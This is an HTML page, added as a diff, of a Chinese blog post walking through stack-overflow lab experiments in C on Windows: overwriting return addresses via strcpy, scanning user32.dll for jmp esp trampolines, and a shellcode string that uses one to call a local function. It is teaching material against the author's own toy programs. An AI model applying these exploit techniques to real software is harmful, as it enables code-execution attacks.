@@ -1,0 +1,804 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="C语言,汇编语言,逆向,shellcode,栈溢出,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="关于栈溢出的简单实验，借此来理解栈溢出。">
+<meta name="keywords" content="C语言,汇编语言,逆向,shellcode,栈溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈溢出简单实验">
+<meta property="og:url" content="http://yoursite.com/2020/02/15/栈溢出简单实验/index.html">
+<meta property="og:site_name" content="pukr&#39;s BLOG">
+<meta property="og:description" content="关于栈溢出的简单实验，借此来理解栈溢出。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2020/02/15/栈溢出简单实验/缓冲区溢出原理.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/15/栈溢出简单实验/demo1.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/15/栈溢出简单实验/覆盖1.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/15/栈溢出简单实验/demo1_跳转.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/15/栈溢出简单实验/demo2_返回.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/15/栈溢出简单实验/跳板原理.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/15/栈溢出简单实验/跳板原理2.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/15/栈溢出简单实验/跳板地址.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/15/栈溢出简单实验/00问题.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/15/栈溢出简单实验/完整版.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/15/栈溢出简单实验/解释.png">
+<meta property="og:updated_time" content="2020-02-15T16:37:47.302Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="栈溢出简单实验">
+<meta name="twitter:description" content="关于栈溢出的简单实验，借此来理解栈溢出。">
+<meta name="twitter:image" content="http://yoursite.com/2020/02/15/栈溢出简单实验/缓冲区溢出原理.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/15/栈溢出简单实验/">
+
+
+
+
+
+  <title>栈溢出简单实验 | pukr's BLOG</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">pukr's BLOG</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人类的悲欢并不相通</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/15/栈溢出简单实验/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="尘林">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/zql.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pukr's BLOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">栈溢出简单实验</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-15T22:07:56+08:00">
+                2020-02-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/基础训练/" itemprop="url" rel="index">
+                    <span itemprop="name">基础训练</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>关于栈溢出的简单实验，借此来理解栈溢出。<br><a id="more"></a></p>
+<h1 id="实验危险函数：strcpy"><a href="#实验危险函数：strcpy" class="headerlink" title="实验危险函数：strcpy"></a>实验危险函数：strcpy</h1><p>这是个交换字符串函数，若是用于交换的字符串超出了原字符串分配到的内存，就会造成数据溢出，覆盖返回地址。<br><img src="/2020/02/15/栈溢出简单实验/缓冲区溢出原理.png" alt><br><blockquote><p>在使用不安全的strcpy库函数时，系统会盲目地将data的全部数据拷贝到buffer指向的内存区域。buffer的长度是有限的，一旦data的数据长度超过BUF_LEN，便会产生缓冲区溢出。</p>
+</blockquote></p>
+<hr>
+<blockquote><p>由于栈是低地址方向增长的，因此局部数组buffer的指针在缓冲区的下方。当把data的数据拷贝到buffer内时，超过缓冲区区域的高地址部分数据会“淹没”原本的其他栈帧数据，根据淹没数据的内容不同，可能会有产生以下情况：</p>
+<p>1、淹没了其他的局部变量。如果被淹没的局部变量是条件变量，那么可能会改变函数原本的执行流程。这种方式可以用于破解简单的软件验证。</p>
+<p>2、淹没了ebp的值。修改了函数执行结束后要恢复的栈指针，将会导致栈帧失去平衡。</p>
+<p>3、淹没了返回地址。这是栈溢出原理的核心所在，通过淹没的方式修改函数的返回地址，使程序代码执行“意外”的流程！</p>
+<p>4、淹没参数变量。修改函数的参数变量也可能改变当前函数的执行结果和流程。</p>
+<p>5、淹没上级函数的栈帧，情况与上述4点类似，只不过影响的是上级函数的执行。当然这里的前提是保证函数能正常返回，即函数地址不能被随意修改（这可能很麻烦！）。</p>
+<p>如果在data本身的数据内就保存了一系列的指令的二进制代码，一旦栈溢出修改了函数的返回地址，并将该地址指向这段二进制代码的其实位置，那么就完成了基本的溢出攻击行为。</p>
+</blockquote>
+<p>首先用个小例子说明下栈溢出。不涉及shellcode，只是用一串字符串实现覆盖跳转。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &quot;string.h&quot;</span><br><span class="line">char *shellcode=&quot;\x64\x65\x66\x67\x68\x69\x70\x71\x05\x10\x40\x00&quot;;</span><br><span class="line">void fun1(int a, int b)</span><br><span class="line">&#123;</span><br><span class="line">   printf(&quot;fun1 run!para a=%d,b=%d\n&quot;,a,b);</span><br><span class="line">&#125;</span><br><span class="line">void fun2(int a)</span><br><span class="line">&#123;</span><br><span class="line">   printf(&quot;fun2 run! para a=%d\n&quot;,a);</span><br><span class="line">&#125;</span><br><span class="line">void fun3(int a,int b,int c)</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;fun3 run! para a=%d,b=%d,c=%d\n&quot;,a,b,c);</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;begin\n&quot;);</span><br><span class="line">    char a[4]=&#123;0&#125;;</span><br><span class="line">	strcpy(a,shellcode);</span><br><span class="line">	fun1(2,3);</span><br><span class="line">    fun2(4);</span><br><span class="line">	fun3(4,5,6);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/02/15/栈溢出简单实验/demo1.png" alt><br>可见，主函数中调用3次函数，执行的时候执行4次。最后由于没有返回地址的问题结束了。<br><img src="/2020/02/15/栈溢出简单实验/覆盖1.png" alt><br><img src="/2020/02/15/栈溢出简单实验/demo1_跳转.png" alt></p>
+<hr>
+<p>第二个小实验，进一步完成利用溢出调用完函数后的返回问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &quot;string.h&quot;</span><br><span class="line">char *shellcode=&quot;\x64\x65\x66\x67\x90\x90\x90\x90\x05\x10\x40\x00&quot;;</span><br><span class="line">//char *shellcode=&quot;\x64\x65\x66\x67\x34\xff\x19\x00\x05\x10\x40\x00&quot;;</span><br><span class="line">void fun1(int a, int b)</span><br><span class="line">&#123;</span><br><span class="line">   printf(&quot;fun1 run!para a=%d,b=%d\n&quot;,a,b);</span><br><span class="line">    char aa[4]=&#123;0&#125;;</span><br><span class="line">	strcpy(aa,shellcode);</span><br><span class="line">&#125;</span><br><span class="line">void fun2(int a)</span><br><span class="line">&#123;</span><br><span class="line">   printf(&quot;fun2 run! para a=%d\n&quot;,a);</span><br><span class="line">&#125;</span><br><span class="line">void fun3(int a,int b,int c)</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;fun3 run! para a=%d,b=%d,c=%d\n&quot;,a,b,c);</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;begin\n&quot;);</span><br><span class="line">	fun1(4198801,2);</span><br><span class="line">	//printf(&quot;end\n&quot;);</span><br><span class="line">	__asm&#123;</span><br><span class="line">		sub esp,4</span><br><span class="line">		mov ebp,0x0019ff30</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;end\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里在fun1的参数中，参数一是调用完fun1后平衡堆栈<code>add esp,8</code>那步操作。因为shellcode字符串中后四位是fun2的地址，刚好溢出覆盖fun1的返回地址，故调用完fun1后会跳转到fun2继续执行。<br>fun2的参数中，由于第二个参数2先入栈，故2会作为fun2的参数。而第一个参数则会作为fun2的返回地址。（具体变化结合OD进行调试）<br><img src="/2020/02/15/栈溢出简单实验/demo2_返回.png" alt></p>
+<hr>
+<h1 id="jmp-esp跳板"><a href="#jmp-esp跳板" class="headerlink" title="jmp esp跳板"></a>jmp esp跳板</h1><blockquote><p>函数返回时，这个地址被弹入 EIP 寄存器，处理器按照 EIP 寄存器中的地址取指令，最后栈中的数据被处理器当成指令得以执行。在函数返回的时候，ESP 恰好指向栈帧中返回地址的后一个位置！<br><img src="/2020/02/15/栈溢出简单实验/跳板原理.png" alt><br><img src="/2020/02/15/栈溢出简单实验/跳板原理2.png" alt><br>由于 ESP 寄存器在函数返回后不被溢出数据干扰，且始终指向返回地址之后的位置，我们可以使用图 3.2.3 所示的这种定位 shellcode 的方法来进行动态定位。<br>（1）用内存中任意一个 jmp esp 指令的地址覆盖函数返回地址，而不是原来用手工查出的shellcode 起始地址直接覆盖。<br>（2）函数返回后被重定向去执行内存中的这条jmp esp指令，而不是直接开始执行shellcode。<br>（3）由于 esp 在函数返回时仍指向栈区（函数返回地址之后），jmp esp 指令被执行后，处理器会到栈区函数返回地址之后的地方取指令执行。<br>（4）重新布置 shellcode。在淹没函数返回地址后，继续淹没一片栈空间。将缓冲区前边一段地方用任意数据填充，把 shellcode 恰好摆放在函数返回地址之后。这样，jmp esp 指令执行过后会恰好跳进 shellcode。</p>
+<p>这种定位 shellcode 的方法使用进程空间里一条 jmp esp 指令作为“跳板”，不论栈帧怎么“移位”，都能够精确地跳回栈区，从而适应程序运行中 shellcode 内存地址的动态变化。</p>
+</blockquote>
+<h2 id="获取跳板地址"><a href="#获取跳板地址" class="headerlink" title="获取跳板地址"></a>获取跳板地址</h2><p><strong>利用动态链接库中的jmp esp指令地址，如user32.dll，kernel32.dll。</strong><br><blockquote><p>我们应当明白除了 PE 文件的代码被读入内存空间，一些经常被用到的动态链接库也将会一同被映射到内存。其中，诸如 kernel.32.dll、user32.dll 之类的动态链接库会被几乎所有的进程加载，且加载基址始终相同。2.4 节实验中的有漏洞的密码验证程序已经加载了 user32.dll，所以我们准备使用 user32.dll中的 jmp esp 作为跳板。获得 user32.dll 内跳转指令地址最直观的方法就是编程序搜索内存。</p>
+</blockquote><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#define DLL_NAME &quot;user32.dll&quot;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    BYTE* ptr;</span><br><span class="line">    int position,address;</span><br><span class="line">    HINSTANCE handle;</span><br><span class="line">    BOOL done_flag = FALSE;</span><br><span class="line">    handle=LoadLibrary(DLL_NAME);</span><br><span class="line">    if(!handle)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot; load dll erro !&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    ptr = (BYTE*)handle;</span><br><span class="line"> </span><br><span class="line">    for(position = 0; !done_flag; position++)</span><br><span class="line">    &#123;</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            if(ptr[position] == 0xFF &amp;&amp; ptr[position+1] == 0xE4)</span><br><span class="line">            &#123;</span><br><span class="line">                //0xFFE4 is the opcode of jmp esp</span><br><span class="line">                int address = (int)ptr + position;</span><br><span class="line">                printf(&quot;OPCODE found at 0x%x\n&quot;,address);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch(...)</span><br><span class="line">        &#123;</span><br><span class="line">            int address = (int)ptr + position;</span><br><span class="line">            printf(&quot;END OF 0x%x\n&quot;, address);</span><br><span class="line">            done_flag = 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/15/栈溢出简单实验/跳板地址.png" alt></p>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &quot;string.h&quot;</span><br><span class="line">#include &quot;windows.h&quot;</span><br><span class="line">char *shellcode=&quot;\x64\x65\x66\x67\x68\x69\x70\x71\xcc\x3a\xd9\x77\x90\x90\x90\x90\x6a\x05\x6a\x04\x6a\x03\x33\xdb\x68\x0a\x10\x40\x2e\x89\x5c\x24\x03\x8b\x04\x24\xff\xd0\x83\xc4\x10&quot;;</span><br><span class="line"></span><br><span class="line">void fun1(int a, int b)</span><br><span class="line">&#123;</span><br><span class="line">   printf(&quot;fun1 run!para a=%d,b=%d\n&quot;,a,b);</span><br><span class="line">    char aa[4]=&#123;0&#125;;</span><br><span class="line">	strcpy(aa,shellcode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void fun3(int a,int b,int c)</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;fun3 run! para a=%d,b=%d,c=%d\n&quot;,a,b,c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*void fun2(int a)</span><br><span class="line">&#123;</span><br><span class="line">   printf(&quot;fun2 run! para a=%d\n&quot;,a);</span><br><span class="line">&#125;*/</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	HINSTANCE libHandle;</span><br><span class="line">	char *dll=&quot;user32.dll&quot;;</span><br><span class="line">    libHandle=LoadLibrary(dll);</span><br><span class="line">    //LoadLibrary(dll);</span><br><span class="line">	printf(&quot;begin\n&quot;);</span><br><span class="line">	fun1(1,2);</span><br><span class="line">    </span><br><span class="line">	/*_asm&#123;</span><br><span class="line">	push 5</span><br><span class="line">	push 4</span><br><span class="line">	push 3</span><br><span class="line">	xor ebx,ebx</span><br><span class="line">	push 0x2e40100A</span><br><span class="line">	mov [esp+3],ebx</span><br><span class="line">	mov eax,dword ptr [esp]</span><br><span class="line">	call eax</span><br><span class="line">	add esp,16</span><br><span class="line">	&#125;*/</span><br><span class="line">	printf(&quot;end\n&quot;);</span><br><span class="line">	return	0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>返回地址是user32内的jmp esp跳转指令，执行完jmp esp后函数eip指向他的下一个内存即esp的位置，但是esp的位置是shellcode部分，所以执行shellcode——先参数压栈再调用fun3。<br>fun3地址有00，所以通过以下方法（具体看前一篇文章）解决00截断问题。<br><img src="/2020/02/15/栈溢出简单实验/00问题.png" alt><br><img src="/2020/02/15/栈溢出简单实验/完整版.png" alt><br><img src="/2020/02/15/栈溢出简单实验/解释.png" alt></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/C语言/" rel="tag"># C语言</a>
+          
+            <a href="/tags/汇编语言/" rel="tag"># 汇编语言</a>
+          
+            <a href="/tags/逆向/" rel="tag"># 逆向</a>
+          
+            <a href="/tags/shellcode/" rel="tag"># shellcode</a>
+          
+            <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/13/大猪蹄子语录/" rel="next" title="大猪蹄子语录">
+                <i class="fa fa-chevron-left"></i> 大猪蹄子语录
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/18/shellcode编码解码/" rel="prev" title="shellcode编码解码">
+                shellcode编码解码 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/zql.jpg" alt="尘林">
+            
+              <p class="site-author-name" itemprop="name">尘林</p>
+              <p class="site-description motion-element" itemprop="description">势，只会裹挟随波逐流之人。一心既定，便不问大势所趋。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">52</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">66</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#实验危险函数：strcpy"><span class="nav-number">1.</span> <span class="nav-text">实验危险函数：strcpy</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#jmp-esp跳板"><span class="nav-number">2.</span> <span class="nav-text">jmp esp跳板</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#获取跳板地址"><span class="nav-number">2.1.</span> <span class="nav-text">获取跳板地址</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">尘林</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
